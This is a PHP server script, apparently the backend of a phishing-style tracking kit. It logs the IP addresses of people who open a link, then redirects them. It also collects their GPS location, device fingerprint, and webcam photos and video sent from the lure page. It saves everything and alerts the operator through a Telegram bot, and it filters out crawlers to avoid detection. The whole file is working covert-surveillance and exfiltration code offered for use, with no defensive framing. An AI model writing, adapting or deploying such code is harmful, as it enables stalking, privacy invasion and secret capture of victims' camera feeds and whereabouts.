<?php
$action = $_GET['a'] ?? $_POST['a'] ?? 'index';
$baseDir = 'user_info';
$telegram_bot_token = '';
$telegram_chat_id = '';
if (!is_dir($baseDir)) mkdir($baseDir, 0755, true);

function sendTelegram($msg) {
    global $telegram_bot_token, $telegram_chat_id;
    if (empty($telegram_bot_token) || empty($telegram_chat_id)) return;
    $url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
    $data = ['chat_id' => $telegram_chat_id, 'text' => $msg, 'parse_mode' => 'HTML'];
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context  = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

function sendTelegramMedia($file, $type, $caption) {
    global $telegram_bot_token, $telegram_chat_id;
    if (empty($telegram_bot_token) || empty($telegram_chat_id)) return;
    
    $url = "https://api.telegram.org/bot$telegram_bot_token/send" . ucfirst($type);
    $realPath = realpath($file);
    
    // safe use of curl via shell
    $cmd = "curl -s -X POST ".escapeshellarg($url)." -F chat_id=".escapeshellarg($telegram_chat_id)." -F ".escapeshellarg($type)."=@".escapeshellarg($realPath)." -F caption=".escapeshellarg($caption)." -F parse_mode=HTML";
    exec($cmd);
}

function getClientIP() {
    $headers = ['HTTP_X_LOOPHOLE_CLIENT_IP', 'HTTP_CF_CONNECTING_IP','HTTP_X_REAL_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_FORWARDED_FOR','HTTP_FORWARDED','HTTP_CLIENT_IP','REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            if (strpos($ip, ',') !== false) $ip = trim(explode(',', $ip)[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP) && !isLocalIP($ip)) return $ip;
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function isLocalIP($ip) {
    if ($ip === '127.0.0.1' || $ip === '::1' || $ip === 'localhost') return true;
    if (strpos($ip, '192.168.') === 0) return true;
    if (strpos($ip, '10.') === 0) return true;
    if (preg_match('/^172\.(1[6-9]|2[0-9]|3[0-1])\./', $ip)) return true;
    return false;
}

function logIP($baseDir) {
    $ip = getClientIP();
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $ref = $_SERVER['HTTP_REFERER'] ?? 'Direct';
    $time = date('Y-m-d H:i:s');
    
    $ignoredAgents = ['Go-http-client', 'curl', 'Wget', 'python-requests', 'bot', 'spider', 'crawler', 'cloudflare', 'Let\'s Encrypt'];
    foreach ($ignoredAgents as $ignored) {
        if (stripos($ua, $ignored) !== false) {
            return;
        }
    }
    if ($ua === 'Unknown' || strlen($ua) < 10) {
        return;
    }
    if (isLocalIP($ip)) {
        return;
    }
    
    $sessionFile = $baseDir . '/ip_sessions.tmp';
    $sessionKey = md5($ip . $ua);
    $sessions = file_exists($sessionFile) ? json_decode(file_get_contents($sessionFile), true) ?? [] : [];
    $now = time();
    $sessions = array_filter($sessions, function($t) use ($now) { return ($now - $t) < 30; });
    if (!isset($sessions[$sessionKey])) {
        $sessions[$sessionKey] = $now;
        file_put_contents($sessionFile, json_encode($sessions));
        $data = "IP: $ip\r\nUser-Agent: $ua\r\nReferer: $ref\r\nTime: $time\r\n---\r\n";
        file_put_contents('ip.txt', $data, FILE_APPEND);
        file_put_contents($baseDir . '/saved.ip.txt', $data, FILE_APPEND);
        $tg_msg = "<b>🔌 Target Opened Link!</b>\n";
        $tg_msg .= "<b>IP:</b> <code>$ip</code>\n";
        $tg_msg .= "<b>Time:</b> <code>$time</code>\n";
        $tg_msg .= "<b>UA:</b> <code>$ua</code>";
        sendTelegram($tg_msg);
    }
}

switch ($action) {
    case 'index':
        logIP($baseDir);
        header("Location: index2.html");
        exit;
        
    case 'loc':
        $date = date('dMYHis');
        parse_str(file_get_contents('php://input'), $d);
        $lat = $d['lat'] ?? 'Unknown';
        $lon = $d['lon'] ?? 'Unknown';
        $acc = $d['acc'] ?? 'Unknown';
        $alt = $d['alt'] ?? 'Unknown';
        $heading = $d['heading'] ?? 'Unknown';
        $speed = $d['speed'] ?? 'Unknown';
        $platform = $d['platform'] ?? 'Unknown';
        $browser = $d['browser'] ?? 'Unknown';
        $cores = $d['cores'] ?? 'Unknown';
        $ram = $d['ram'] ?? 'Unknown';
        $gpu_vendor = $d['gpu_vendor'] ?? 'Unknown';
        $gpu_renderer = $d['gpu_renderer'] ?? 'Unknown';
        $screen = $d['screen'] ?? 'Unknown';
        $os = $d['os'] ?? 'Unknown';
        $timezone = $d['timezone'] ?? 'Unknown';
        $language = $d['language'] ?? 'Unknown';
        $connection = $d['connection'] ?? 'Unknown';
        $error = $d['error'] ?? null;
        $ip = getClientIP();
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        
        if ($error) {
            $out = "=== LOCATION ERROR ===\nTime: " . date('Y-m-d H:i:s') . "\nError: $error\nPlatform: $platform\nBrowser: $browser\nOS: $os\nIP: $ip\n\n";
            file_put_contents($baseDir . "/LocationError.log", $out, FILE_APPEND);
        } elseif ($lat !== 'Unknown' && $lon !== 'Unknown') {
            $out = "=== TARGET DATA ===\nCapture Time: " . date('Y-m-d H:i:s') . "\n\n" .
                   "LOCATION:\nLatitude: $lat\nLongitude: $lon\nAccuracy: $acc meters\nAltitude: $alt\nHeading: $heading\nSpeed: $speed\n" .
                   "Google Maps: https://www.google.com/maps/place/$lat,$lon\n\n" .
                   "DEVICE INFO:\nPlatform: $platform\nOS: $os\nBrowser: $browser\nCPU Cores: $cores\nRAM: $ram GB\n" .
                   "GPU Vendor: $gpu_vendor\nGPU Renderer: $gpu_renderer\nScreen: $screen\nTimezone: $timezone\nLanguage: $language\nConnection: $connection\n\n" .
                   "NETWORK:\nIP Address: $ip\nUser Agent: $ua\n\n";
            $accR = is_numeric($acc) ? round($acc) : $acc;
            $file = $baseDir . '/location_' . $date . '_acc' . $accR . 'm.txt';
            file_put_contents($file, $out);
            file_put_contents($baseDir . "/current_location.txt", $out);
            file_put_contents($baseDir . "/LocationLog.log", "Location: $lat,$lon (±{$acc}m)\n", FILE_APPEND);
            
            $tg_msg = "<b>📍 TARGET DATA RECEIVED</b>\n";
            $tg_msg .= "<b>⏱ Time:</b> <code>" . date('Y-m-d H:i:s') . "</code>\n\n";
            $tg_msg .= "<b>🗺 LOCATION</b>\n";
            $tg_msg .= "<b>Lat:</b> <code>$lat</code>\n";
            $tg_msg .= "<b>Lon:</b> <code>$lon</code>\n";
            $tg_msg .= "<b>Acc:</b> <code>$acc m</code>\n";
            $tg_msg .= "<a href='https://www.google.com/maps/place/$lat,$lon'>🌏 Open in Google Maps</a>\n\n";
            $tg_msg .= "<b>📱 DEVICE</b>\n";
            $tg_msg .= "<b>OS:</b> <code>$os</code>\n";
            $tg_msg .= "<b>Platform:</b> <code>$platform</code>\n";
            $tg_msg .= "<b>Browser:</b> <code>$browser</code>\n";
            $tg_msg .= "<b>CPU:</b> <code>$cores Cores</code>\n";
            $tg_msg .= "<b>RAM:</b> <code>$ram GB</code>\n\n";
            $tg_msg .= "<b>🌐 NETWORK</b>\n";
            $tg_msg .= "<b>IP:</b> <code>$ip</code>\n";
            $tg_msg .= "<b>UA:</b> <code>$ua</code>";
            
            sendTelegram($tg_msg);
            $saved = $baseDir . '/saved_locations';
            if (!is_dir($saved)) mkdir($saved, 0755, true);
            copy($file, $saved . '/' . basename($file));
        }
        http_response_code(204);
        exit;
        
    case 'cam':
        $date = date('dMYHis');
        $img = $_POST['cat'] ?? '';
        if (!empty($img)) {
            $capDir = $baseDir . '/captured_images/' . date('Y-m-d');
            if (!is_dir($capDir)) mkdir($capDir, 0755, true);
            $filtered = substr($img, strpos($img, ",") + 1);
            $decoded = base64_decode($filtered);
            $filename = $capDir . '/cam_' . $date . '.png';
            file_put_contents($filename, $decoded);
            file_put_contents("Log.log", "Image saved: $filename\n", FILE_APPEND);
            $tg_msg = "<b>📸 Image Captured!</b>\n";
            $tg_msg .= "<b>File:</b> <code>" . basename($filename) . "</code>\n";
            $tg_msg .= "<i>(Check server for file)</i>";
            sendTelegram($tg_msg);
        }
        http_response_code(204);
        exit;
        
    case 'vid':
        $date = date('dMYHis');
        $video = $_POST['video'] ?? '';
        if (!empty($video)) {
            $vidDir = $baseDir . '/captured_videos/' . date('Y-m-d');
            if (!is_dir($vidDir)) mkdir($vidDir, 0755, true);
            $filtered = substr($video, strpos($video, ",") + 1);
            $decoded = base64_decode($filtered);
            $ext = 'webm';
            if (strpos($video, 'video/mp4') !== false) $ext = 'mp4';
            $filename = $vidDir . '/vid_' . $date . '.' . $ext;
            file_put_contents($filename, $decoded);
            file_put_contents("Log.log", "Video saved: $filename\n", FILE_APPEND);
            $tg_msg = "<b>🎥 Video Captured!</b>\n";
            $tg_msg .= "<b>File:</b> <code>" . basename($filename) . "</code>\n";
            $tg_msg .= "<i>(Check server for file)</i>";
            sendTelegram($tg_msg);
        }
        http_response_code(204);
        exit;
        
    default:
        http_response_code(404);
        exit;
}
?>

